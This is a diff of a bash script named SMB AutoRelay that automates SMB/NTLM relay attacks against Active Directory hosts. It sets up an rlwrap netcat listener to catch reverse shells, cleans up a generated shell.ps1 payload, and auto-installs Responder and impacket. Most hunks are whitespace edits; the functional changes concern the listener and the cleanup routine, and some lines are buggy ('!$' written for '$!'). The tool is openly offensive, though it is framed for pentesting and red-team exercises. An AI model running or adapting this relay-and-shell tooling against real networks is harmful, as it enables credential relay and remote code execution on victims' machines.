@@ -2,7 +2,7 @@
 
 # Name: SMB AutoRelay
 # Author: chesire
-# 
+#
 # Description: SMB AutoRelay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
 # Usage: ./smbAutoRelay.sh -i <interface> -t <TargetsFilePath>
 # Example: ./smbAutoRelay -i eth0 -t ./targets.txt
@@ -28,12 +28,16 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
 	tmux kill-session -t 'smbautorelay*' &>/dev/null
-    if [ ! -z $gnome_nc_PID ];then
-      kill -9 $gnome_nc_PID
-      wait $gnome_nc_PID &>/dev/null
-    fi
-	tput cnorm
-	exit 1
+
+	if [ -e "$(pwd)/shell.ps1" ];then
+		rm -f $(pwd)/shell.ps1 &>/dev/null
+	fi
+
+	if [ ! -z $terminal_nc_PID ];then
+		kill -9 $terminal_nc_PID &>/dev/null
+		wait $terminal_nc_PID &>/dev/null
+    	fi
+	tput cnorm; exit 1
 }
 
 function banner(){
@@ -41,8 +45,8 @@ function banner(){
     echo -e "   _____ __  _______     ___         __        ____       __
   / ___//  |/  / __ )   /   | __  __/ /_____  / __ \___  / /___ ___  __
   \__ \/ /|_/ / __  |  / /| |/ / / / __/ __ \/ /_/ / _ \/ / __ \`/ / / /
- ___/ / /  / / /_/ /  / ___ / /_/ / /_/ /_/ / _, _/  __/ / /_/ / /_/ / 
-/____/_/  /_/_____/  /_/  |_\__,_/\__/\____/_/ |_|\___/_/\__,_/\__, /  
+ ___/ / /  / / /_/ /  / ___ / /_/ / /_/ /_/ / _, _/  __/ / /_/ / /_/ /
+/____/_/  /_/_____/  /_/  |_\__,_/\__/\____/_/ |_|\___/_/\__,_/\__, /
                                                               /____/   "
 	echo -e "${endColour}"
 	sleep 0.5
@@ -59,10 +63,10 @@ function helpMenu(){
 }
 
 function checkApt(){
-	
+
 	program=$1
 	if [ "$program" == "net-tools" ];then program="ifconfig"; fi
-	
+
 	which $program &>/dev/null
 	if [ $? -eq 0 ];then
 		if [ "$program" == "ifconfig" ];then program="net-tools"; fi
@@ -71,7 +75,7 @@ function checkApt(){
 		if [ "$program" == "ifconfig" ];then program="net-tools"; fi
 		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} $program not installed, installing..."; sleep 0.5; fi
 		apt install -y $program &>/dev/null
-		
+
 		if [ "$program" == "net-tools" ];then program="ifconfig"; fi
 		which $program &>/dev/null
 		if [ $? -eq 0 ];then
@@ -97,10 +101,10 @@ function makeBck(){
 function checkProgramsNeeded(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
-	
+
 	programs=(tmux rlwrap python python3 netcat wget xterm net-tools)
 	for program in "${programs[@]}"; do checkApt $program; done
-	
+
 	test -f $(pwd)/responder/Responder.py &>/dev/null
 	if [ $? -eq 0 ]; then
         	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.5; fi
@@ -123,7 +127,7 @@ function checkProgramsNeeded(){
 		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.5; fi
 	else
 		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing in '$(pwd)/impacket' directory"; sleep 0.5; fi
-		
+
 		mkdir $(pwd)/impacket; git clone https://github.com/SecureAuthCorp/impacket.git $(pwd)/impacket &>/dev/null
 		python3 -m pip install impacket &>/dev/null
         	test -f "$(pwd)/impacket/examples/ntlmrelayx.py" &>/dev/null
@@ -227,17 +231,20 @@ function relayingAttack(){
   done
 
   command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
-  if [ $terminal == "xterm" ];then
-    xterm -hold -e "$command" &>/dev/null &
-  elif [ $terminal == "gnome" ];then
+  if [ $terminal == "gnome" ];then
     gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
+    terminal_nc_PID=!$
   elif [ $terminal == "termite" ];then
     termite -hold -e "$command" &>/dev/null &
+    terminal_nc_PID=!$
   else
-    echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; tput cnorm; exit 1
+    xterm -hold -e "$command" &>/dev/null &
+    terminal_nc_PID=!$
   fi
 
-  terminal_nc_PID=$!
+  if [ $? -ne 0 ];then
+	echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; tput cnorm; exit 1
+  fi
 
   sleep 5
 
@@ -246,18 +253,14 @@ function relayingAttack(){
     portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u)
     sleep 0.5
   done
-  
-  sleep 3
 
-  rhost=$(netstat -tnualp | grep $lport | awk '{print $4}' | tail -1 | awk -F: '{print $1}')
+  rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
   checkrhost=''
   while read line; do
     if [ "$rhost" == "$line" ];then
       checkrhost=1
     fi
   done < $targets
-  
-  sleep 3
 
   if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
     echo -ne "${blueColour}[*]${endColour} Authenticating to target $rhost "
@@ -314,7 +317,7 @@ function rmsw(){
 
 # Main function
 banner
-if [ "$(id -u)" == 0 ]; then 
+if [ "$(id -u)" == 0 ]; then
 	tput civis
 
     quiet='1'
